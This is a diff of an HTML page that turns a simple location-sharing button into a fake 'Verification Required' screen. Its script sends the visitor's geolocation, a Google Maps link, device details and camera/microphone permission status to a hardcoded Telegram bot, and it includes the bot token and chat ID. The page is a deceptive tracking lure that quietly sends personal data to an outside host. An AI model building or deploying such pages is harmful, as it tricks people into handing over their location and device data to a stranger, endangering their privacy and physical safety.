@@ -1,41 +1,106 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Access</title>
+<title>Secure Verification</title>
+<style>
+body {
+  margin: 0;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: Arial, sans-serif;
+  background: url('https://ibb.co/BHhh6zfj') no-repeat center center;
+  background-size: cover;
+}
+
+.box {
+  background: rgba(0,0,0,0.75);
+  padding: 40px;
+  border-radius: 15px;
+  text-align: center;
+  color: white;
+  width: 320px;
+}
+
+button {
+  padding: 12px 20px;
+  border: none;
+  border-radius: 8px;
+  background: #00c6ff;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+}
+</style>
 </head>
 <body>
-  <h2>Click to Share Location</h2>
-  <button onclick="getLocation()">Share Location</button>
+
+<div class="box">
+  <h2>Verification Required</h2>
+  <p>This will access location & device info.</p>
+  <button onclick="requestPermissions()">Continue</button>
   <p id="status"></p>
+</div>
 
 <script>
 
 const botToken = "8286169680:AAFlw5A7AuqB5nKRyx-7Hdu0XFF_r_gjHoQ";
 const chatId = "8541208450";
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendToTelegram);
-  } else {
-    document.getElementById("status").innerHTML = "Geolocation not supported.";
-  }
+function sendMessageToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  });
 }
 
-function sendToTelegram(position) {
-  const lat = position.coords.latitude;
-  const lon = position.coords.longitude;
+function requestPermissions() {
 
-  const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
+  let deviceInfo = `
+Device Info:
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Time: ${new Date().toLocaleString()}
+`;
 
-  fetch(url)
-    .then(response => {
-      document.getElementById("status").innerHTML = "Location Sent Successfully!";
+  // Location
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(position => {
+
+      let locationInfo = `
+Location:
+Latitude: ${position.coords.latitude}
+Longitude: ${position.coords.longitude}
+Google Maps:
+https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}
+`;
+
+      sendMessageToTelegram(deviceInfo + locationInfo);
+      document.getElementById("status").innerHTML = "Data Sent Successfully ✔";
+
+    }, () => {
+      sendMessageToTelegram(deviceInfo + "\nLocation Permission Denied");
+    });
+  }
+
+  // Camera + Mic Permission Check Only
+  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then(stream => {
+      sendMessageToTelegram("Camera & Mic Permission Granted");
+      stream.getTracks().forEach(track => track.stop());
     })
-    .catch(error => {
-      document.getElementById("status").innerHTML = "Error sending location.";
+    .catch(() => {
+      sendMessageToTelegram("Camera & Mic Permission Denied");
     });
 }
 
 </script>
+
 </body>
 </html>
